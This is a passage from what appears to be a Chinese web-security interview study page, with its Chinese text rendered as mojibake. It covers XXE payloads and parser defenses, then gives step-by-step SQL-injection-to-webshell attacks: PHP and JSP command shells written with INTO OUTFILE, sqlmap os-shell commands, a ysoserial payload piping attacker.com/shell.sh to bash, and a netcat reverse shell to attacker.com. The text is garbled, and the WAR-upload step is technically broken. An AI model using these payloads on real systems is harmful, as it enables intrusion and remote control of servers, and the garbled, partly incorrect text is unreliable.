´åç³»ç»Ÿèµ„æºã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…·ä½“çš„XXEæ¼æ´ç¤ºä¾‹å’Œé˜²å¾¡æªæ–½ï¼š</p><h4 id="1-æ–‡ä»¶è¯»å–"><a href="#1-æ–‡ä»¶è¯»å–" class="headerlink" title="1. æ–‡ä»¶è¯»å–"></a>1. æ–‡ä»¶è¯»å–</h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡XXEæ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æäº¤ä»¥ä¸‹XMLæ•°æ®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µXMLå®šä¹‰äº†ä¸€ä¸ªå¤–éƒ¨å®ä½“<code>file</code>ï¼Œå®ƒå¼•ç”¨äº†æœåŠ¡å™¨ä¸Šçš„<code>/etc/passwd</code>æ–‡ä»¶ã€‚å½“åº”ç”¨ç¨‹åºè§£æè¿™ä¸ªXMLæ—¶ï¼Œä¼šè¯»å–è¯¥æ–‡ä»¶çš„å†…å®¹å¹¶å°†å…¶åŒ…å«åœ¨å“åº”ä¸­ã€‚</p><h4 id="2-å†…ç½‘æ¢æµ‹"><a href="#2-å†…ç½‘æ¢æµ‹" class="headerlink" title="2. å†…ç½‘æ¢æµ‹"></a>2. å†…ç½‘æ¢æµ‹</h4><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨XXEæ¼æ´æ¢æµ‹å†…ç½‘ä¸­çš„å…¶ä»–ç³»ç»Ÿã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æäº¤ä»¥ä¸‹XMLæ•°æ®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">scan</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal.example.com&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;scan;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µXMLå®šä¹‰äº†ä¸€ä¸ªå¤–éƒ¨å®ä½“<code>scan</code>ï¼Œå®ƒå¼•ç”¨äº†å†…ç½‘ä¸­çš„ä¸€ä¸ªURLã€‚å½“åº”ç”¨ç¨‹åºè§£æè¿™ä¸ªXMLæ—¶ï¼Œä¼šå°è¯•è®¿é—®è¯¥URLï¼Œä»è€Œæš´éœ²äº†å†…ç½‘çš„å­˜åœ¨ã€‚</p><h4 id="3-æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰"><a href="#3-æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰" class="headerlink" title="3. æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰"></a>3. æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰</h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡XXEæ¼æ´å‘èµ·æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æäº¤ä»¥ä¸‹XMLæ•°æ®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;a;</span><span class="symbol">&amp;b;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µXMLå®šä¹‰äº†å¤šä¸ªå¤–éƒ¨å®ä½“ï¼Œæ¯ä¸ªå®ä½“éƒ½å¼•ç”¨äº†ä¸€ä¸ªæ— é™å¤§çš„æ–‡ä»¶ï¼ˆå¦‚<code>/dev/zero</code>ï¼‰ã€‚å½“åº”ç”¨ç¨‹åºè§£æè¿™ä¸ªXMLæ—¶ï¼Œä¼šå°è¯•è¯»å–è¿™äº›æ–‡ä»¶ï¼Œå¯¼è‡´èµ„æºè€—å°½ï¼Œä»è€Œå¼•å‘æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><h4 id="1-ç¦ç”¨DTD"><a href="#1-ç¦ç”¨DTD" class="headerlink" title="1. ç¦ç”¨DTD"></a>1. ç¦ç”¨DTD</h4><p>åœ¨XMLè§£æå™¨ä¸­ç¦ç”¨DTDï¼ˆDocument Type Definitionï¼‰å¯ä»¥é˜²æ­¢å¤–éƒ¨å®ä½“çš„è§£æã€‚ä¾‹å¦‚ï¼Œåœ¨Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç¦ç”¨äº†DTDï¼Œä»è€Œé˜²æ­¢äº†XXEæ”»å‡»ã€‚</p><h4 id="2-ç¦æ­¢å¤–éƒ¨å®ä½“è§£æ"><a href="#2-ç¦æ­¢å¤–éƒ¨å®ä½“è§£æ" class="headerlink" title="2. ç¦æ­¢å¤–éƒ¨å®ä½“è§£æ"></a>2. ç¦æ­¢å¤–éƒ¨å®ä½“è§£æ</h4><p>åœ¨XMLè§£æå™¨ä¸­ç¦æ­¢å¤–éƒ¨å®ä½“è§£æã€‚ä¾‹å¦‚ï¼Œåœ¨Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç¦æ­¢äº†å¤–éƒ¨å®ä½“çš„è§£æï¼Œä»è€Œé˜²æ­¢äº†XXEæ”»å‡»ã€‚</p><h4 id="3-é€šè¿‡é»‘åå•è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"><a href="#3-é€šè¿‡é»‘åå•è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®" class="headerlink" title="3. é€šè¿‡é»‘åå•è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"></a>3. é€šè¿‡é»‘åå•è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</h4><p>åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå¯ä»¥ä½¿ç”¨é»‘åå•æ¥è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ï¼Œé˜²æ­¢æ¶æ„æ„é€ çš„XMLæ•°æ®è¢«è§£æã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æ£€æµ‹XMLæ•°æ®ä¸­æ˜¯å¦åŒ…å«å¤–éƒ¨å®ä½“çš„å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xmlData</span> <span class="operator">=</span> ...; <span class="comment">// ç”¨æˆ·æäº¤çš„XMLæ•°æ®</span></span><br><span class="line"><span class="keyword">if</span> (xmlData.contains(<span class="string">&quot;&lt;!ENTITY&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;XXE attack detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"><a href="#ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"></a>ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ</h2><p>1ï¼‰è¿‡æ»¤ç”¨æˆ·æ•°æ®ï¼Œå¦‚â€œ&#x2F;â€ï¼Œâ€œ*â€ï¼Œâ€.â€ç­‰ç‰¹æ®Šå­—ç¬¦<br>2ï¼‰æ›´æ–°ä¸­é—´ä»¶<br>3ï¼‰è¦ä¸‹è½½çš„æ–‡ä»¶åœ°å€ä¿å­˜è‡³æ•°æ®åº“ä¸­<br>4ï¼‰æ–‡ä»¶è·¯å¾„ä¿å­˜è‡³æ•°æ®åº“ï¼Œè®©ç”¨æˆ·æäº¤æ–‡ä»¶å¯¹åº” ID æˆ– session ä¸‹è½½æ–‡ä»¶<br>5ï¼‰ç”¨æˆ·ä¸‹è½½æ–‡ä»¶ä¹‹å‰éœ€è¦è¿›è¡Œæƒé™åˆ¤æ–­<br>6ï¼‰æ–‡ä»¶æ”¾åœ¨ web æ— æ³•ç›´æ¥è®¿é—®çš„ç›®å½•ä¸‹<br>7ï¼‰ä¸å…è®¸æä¾›ç›®å½•éå†æœåŠ¡<br>8ï¼‰å…¬å¼€æ–‡ä»¶å¯æ”¾ç½®åœ¨ web åº”ç”¨ç¨‹åºä¸‹è½½ç›®å½•ä¸­é€šè¿‡é“¾æ¥è¿›è¡Œä¸‹è½½</p><h2 id="CSRF-æ”»å‡»å’Œ-XSS-æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«"><a href="#CSRF-æ”»å‡»å’Œ-XSS-æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«" class="headerlink" title="CSRF æ”»å‡»å’Œ XSS æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«"></a>CSRF æ”»å‡»å’Œ XSS æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«</h2><p>CSRF æ”»å‡»ä¸éœ€è¦å°†æ¶æ„ä»£ç æ³¨å…¥ç”¨æˆ·çš„é¡µé¢ï¼Œä»…ä»…æ˜¯åˆ©ç”¨æœåŠ¡å™¨çš„æ¼æ´å’Œç”¨æˆ·çš„ç™»å½•çŠ¶æ€æ¥å®æ–½æ”»å‡»ã€‚<br>CSRF æ”»å‡»æˆæœ¬ä¹Ÿæ¯” XSS ä½ï¼Œç”¨æˆ·æ¯å¤©éƒ½è¦è®¿é—®å¤§é‡ç½‘é¡µï¼Œæ— æ³•ç¡®è®¤æ¯ä¸€ä¸ªç½‘é¡µçš„åˆæ³•æ€§ï¼Œä»ç”¨æˆ·è§’åº¦æ¥è¯´ï¼Œæ— æ³•å½»åº•é˜²æ­¢ CSRF æ”»å‡»ã€‚</p><h2 id="å‘ç°-demo-jsp-uid-110-æ³¨å…¥ç‚¹ï¼Œä½ æœ‰å“ªå‡ ç§æ€è·¯è·å–-webshellï¼Œå“ªç§æ˜¯ä¼˜é€‰"><a href="#å‘ç°-demo-jsp-uid-110-æ³¨å…¥ç‚¹ï¼Œä½ æœ‰å“ªå‡ ç§æ€è·¯è·å–-webshellï¼Œå“ªç§æ˜¯ä¼˜é€‰" class="headerlink" title="å‘ç° demo.jsp?uid&#x3D;110 æ³¨å…¥ç‚¹ï¼Œä½ æœ‰å“ªå‡ ç§æ€è·¯è·å– webshellï¼Œå“ªç§æ˜¯ä¼˜é€‰"></a>å‘ç° demo.jsp?uid&#x3D;110 æ³¨å…¥ç‚¹ï¼Œä½ æœ‰å“ªå‡ ç§æ€è·¯è·å– webshellï¼Œå“ªç§æ˜¯ä¼˜é€‰</h2><p>æœ‰å†™å…¥æƒé™çš„ï¼Œæ„é€ è”åˆæŸ¥è¯¢è¯­å¥ä½¿ç”¨ using INTO OUTFILEï¼Œå¯ä»¥å°†æŸ¥è¯¢çš„è¾“å‡ºé‡å®šå‘åˆ°ç³»ç»Ÿçš„æ–‡ä»¶ä¸­ï¼Œè¿™æ ·å»å†™å…¥ WebShell ä½¿ç”¨ sqlmap â€“os-shell åŸç†å’Œä¸Šé¢ä¸€ç§ç›¸åŒï¼Œæ¥ç›´æ¥è·å¾—ä¸€ä¸ª Shellï¼Œè¿™æ ·æ•ˆç‡æ›´é«˜ã€‚<br>é€šè¿‡æ„é€ è”åˆæŸ¥è¯¢è¯­å¥å¾—åˆ°ç½‘ç«™ç®¡ç†å‘˜çš„è´¦æˆ·å’Œå¯†ç ï¼Œç„¶åæ‰«åå°ç™»å½•åå°ï¼Œå†åœ¨åå°é€šè¿‡æ”¹åŒ…ä¸Šä¼ ç­‰æ–¹æ³•ä¸Šä¼  Shellã€‚</p><p><strong>é€‚ç”¨å‰æï¼š</strong></p><ul><li>ç›®æ ‡æ•°æ®åº“æ˜¯ MySQLï¼Œå¹¶ä¸”å½“å‰æ•°æ®åº“ç”¨æˆ·æœ‰ <code>FILE</code> æƒé™ã€‚</li><li>Web ç›®å½•ï¼ˆå¦‚ <code>htdocs</code>ã€<code>www</code>ï¼‰å¯¹æ•°æ®åº“ç”¨æˆ·æ˜¯å¯å†™çš„ã€‚</li></ul><p><strong>åˆ©ç”¨æ–¹å¼ï¼š</strong><br>å¦‚æœæ•°æ®åº“ç”¨æˆ·æ‹¥æœ‰ <code>FILE</code> æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ <code>INTO OUTFILE</code> ç›´æ¥å†™å…¥ WebShellï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…åœ¨ Windows ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:\\xampp\\htdocs\\shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ · <code>shell.php</code> ä¾¿å¯é€šè¿‡ <code>POST</code> æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;cmd=system(&#x27;whoami&#x27;);&quot;</span> http://target.com/shell.php</span><br></pre></td></tr></table></figure><p><strong>å±€é™æ€§ï¼š</strong></p><ul><li><code>secure_file_priv</code> å¯èƒ½ä¼šé™åˆ¶ <code>OUTFILE</code> çš„ä½¿ç”¨ã€‚</li><li>Web æœåŠ¡å™¨å¯èƒ½ç¦æ­¢ <code>.php</code> è§£æï¼ˆå¦‚ä½¿ç”¨ <code>htaccess</code> é™åˆ¶ï¼‰ã€‚</li><li>éœ€è¦ç¡®è®¤ Web ç›®å½•çš„è·¯å¾„ï¼Œè‹¥ä¸æ¸…æ¥šå¯ä»¥å°è¯•å†™å…¥ <code>/tmp/</code> å†å°è¯•æ–‡ä»¶åŒ…å«ã€‚</li></ul><p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong><br>å¯ä»¥ç»“åˆ <strong>SQLMap</strong> è‡ªåŠ¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --file-write=<span class="string">&quot;shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—® <code>http://target.com/shell.php</code>ï¼Œå³å¯æ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</p><p><strong>2. ä½¿ç”¨ <code>LOAD_FILE()</code> è¯»å– WebShell</strong><br>å¦‚æœ <code>INTO OUTFILE</code> å—é™ï¼Œä½† <code>LOAD_FILE()</code> å¯ç”¨ï¼Œå¯ä»¥è¯»å–å·²æœ‰ WebShell æˆ–é…åˆ <strong>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/var/www/html/config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å¦‚æœ Web æœåŠ¡å™¨å­˜åœ¨ <strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ï¼Œå¯ä»¥ç»“åˆ SQL æ³¨å…¥åˆ©ç”¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ <strong>LFI</strong> è®¿é—® <code>/tmp/shell.php</code>ã€‚</p><p><strong>3. SQLMap è‡ªåŠ¨è·å– Shell</strong><br><code>sqlmap</code> è‡ªå¸¦ <code>--os-shell</code> é€‰é¡¹ï¼Œå¯ä»¥è‡ªåŠ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>å¦‚æœæ•°æ®åº“ç”¨æˆ·å…·å¤‡ <strong>å†™æ–‡ä»¶æƒé™</strong>ï¼ŒSQLMap ä¼šè‡ªåŠ¨åˆ›å»º WebShellï¼Œå¹¶æä¾›äº¤äº’å¼å‘½ä»¤è¡Œã€‚</p><h3 id="1-MySQL-JSPï¼šå†™å…¥-WebShell"><a href="#1-MySQL-JSPï¼šå†™å…¥-WebShell" class="headerlink" title="(1) MySQL+JSPï¼šå†™å…¥ WebShell"></a><strong>(1) MySQL+JSPï¼šå†™å…¥ WebShell</strong></h3><p>å¦‚æœ Web æœåŠ¡å™¨è¿è¡Œçš„æ˜¯ JSPï¼Œå¹¶ä¸” <code>INTO OUTFILE</code> å¯ç”¨ï¼Œå¯ä»¥å†™å…¥ <code>.jsp</code> WebShellï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;% Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)); %&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.jsp&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://target.com/shell.jsp?cmd=id&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ã€‚</p><h3 id="2-MySQL-Tomcatï¼šå†™å…¥-WAR-WebShell"><a href="#2-MySQL-Tomcatï¼šå†™å…¥-WAR-WebShell" class="headerlink" title="(2) MySQL+Tomcatï¼šå†™å…¥ WAR WebShell"></a><strong>(2) MySQL+Tomcatï¼šå†™å…¥ WAR WebShell</strong></h3><p>å¦‚æœ <code>INTO OUTFILE</code> å—é™ï¼Œä½†æ•°æ®åº“ç”¨æˆ·æœ‰ <strong>å†™å…¥ Web ç›®å½•æƒé™</strong>ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼  <code>.war</code> æ–‡ä»¶ï¼š</p><ol><li>ç”Ÿæˆ <strong>JSP WebShell</strong>ï¼š<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>); </span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li>å‹ç¼©ä¸º <code>.war</code>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ SQL æ³¨å…¥ä¸Šä¼ ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;context&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;/context&gt;&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/usr/local/tomcat/webapps/shell.war&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>è®¿é—® <code>http://target.com/shell/cmd.jsp?cmd=id</code>ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</li></ol><h3 id="5-é€šè¿‡-Java-ååºåˆ—åŒ–æ¼æ´-Getshell"><a href="#5-é€šè¿‡-Java-ååºåˆ—åŒ–æ¼æ´-Getshell" class="headerlink" title="5. é€šè¿‡ Java ååºåˆ—åŒ–æ¼æ´ Getshell"></a><strong>5. é€šè¿‡ Java ååºåˆ—åŒ–æ¼æ´ Getshell</strong></h3><p>å¦‚æœç›®æ ‡åº”ç”¨ä½¿ç”¨äº† <strong>Apache Commons Collections</strong>ã€<code>fastjson</code> ç­‰ï¼Œå¯èƒ½å­˜åœ¨ Java ååºåˆ—åŒ–æ¼æ´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com/shell.sh | bash&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ SQL æ³¨å…¥å†™å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, LOAD_FILE(<span class="string">&#x27;/tmp/payload.ser&#x27;</span>));</span><br></pre></td></tr></table></figure><p>å¦‚æœåº”ç”¨ç¨‹åºè¯»å– <code>users</code> è¡¨æ•°æ®ï¼Œå¯èƒ½è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚</p><h3 id="6-Java-WebShell-æŒä¹…åŒ–æ–¹å¼"><a href="#6-Java-WebShell-æŒä¹…åŒ–æ–¹å¼" class="headerlink" title="6. Java WebShell æŒä¹…åŒ–æ–¹å¼"></a><strong>6. Java WebShell æŒä¹…åŒ–æ–¹å¼</strong></h3><p>å¦‚æœæˆåŠŸ Getshellï¼Œå¯ä»¥æŒä¹…åŒ–è®¿é—®ï¼š</p><ol><li>**ä¿®æ”¹ Tomcat <code>web.xml</code>**ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/shell.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ ScheduledTask åˆ›å»ºåå‘ Shell</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;nc -e /bin/bash attacker.com 4444&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>æ¤å…¥ Java Agent</strong>ï¼ˆé€‚ç”¨äº Spring Bootï¼‰ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:shell.jar -jar target.jar</span><br></pre></td></tr></table></figure></li></ol><h2 id="è¯´å‡ºè‡³å°‘ä¸‰ç§ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œä»¥åŠä¿®å¤æ–¹å¼"><a href="#è¯´å‡ºè‡³å°‘ä¸‰ç§ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œä»¥åŠä¿®å¤æ–¹å¼" class="headerlink" 